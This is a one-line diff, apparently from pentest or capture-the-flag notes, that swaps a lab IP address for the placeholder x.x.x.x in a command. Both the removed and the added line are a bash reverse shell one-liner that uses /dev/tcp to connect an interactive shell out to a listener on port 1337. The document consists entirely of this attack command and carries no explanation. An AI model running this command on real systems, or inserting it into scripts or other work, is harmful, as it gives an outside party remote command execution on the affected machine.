@@ -1,1 +1,1 @@
-bash -i &> /dev/tcp/10.10.15.122/1337 0>&1
+bash -i &> /dev/tcp/x.x.x.x/1337 0>&1
